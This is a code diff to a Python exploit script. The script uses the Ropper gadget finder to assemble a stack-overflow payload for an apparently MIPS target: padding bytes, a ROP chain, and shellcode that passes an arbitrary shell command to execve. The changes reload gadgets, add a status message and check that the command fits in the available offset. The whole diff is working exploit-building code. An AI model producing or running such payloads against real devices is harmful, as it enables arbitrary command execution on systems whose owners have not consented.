@@ -31,6 +31,7 @@ class MyRopper():
         
         self.rs.options.inst_count = 10
         self.rs.loadGadgetsFor()
+        self.rs.loadGadgetsFor() # sometimes Ropper doesn't update new gadgets
 
     def get_gadgets(self, regex):
         gadgets = []
@@ -133,6 +134,8 @@ def build_shellcode(shellCmd):
     return shell_code
 
 def build_payload(binRop, shellCmd):
+    print("Building shellcode + ROP chain...")
+
     ropChain = b''
     shell_code = build_shellcode(shellCmd)
     
@@ -156,7 +159,12 @@ def build_payload(binRop, shellCmd):
     # to store the shellcode (beacuse of: jr 0x600 + var_4($sp))
     ropChain += b'B' * 0x18  # 0x600 - 0x5E8 = 0x18           (in the last 16 bytes of this offset the shell code will write the arguments for execve)
     ropChain += shell_code   # write the shell code in this "big" offset
-    ropChain += b'C' * (MyRopper.get_ra_offset(stack_finder) - 0x18 - len(shell_code)) # offset because of this: 0x600 + var_4($sp)
+
+    next_gadget_offset = MyRopper.get_ra_offset(stack_finder) - 0x18 - len(shell_code)
+    if next_gadget_offset < 0: # check if shell command fits inside this big offset
+        raise Exception("Shell command too long! Max len: " + str(next_gadget_offset + len(shellCmd)) + " bytes")
+
+    ropChain += b'C' * next_gadget_offset # offset because of this: 0x600 + var_4($sp)
 
 
 
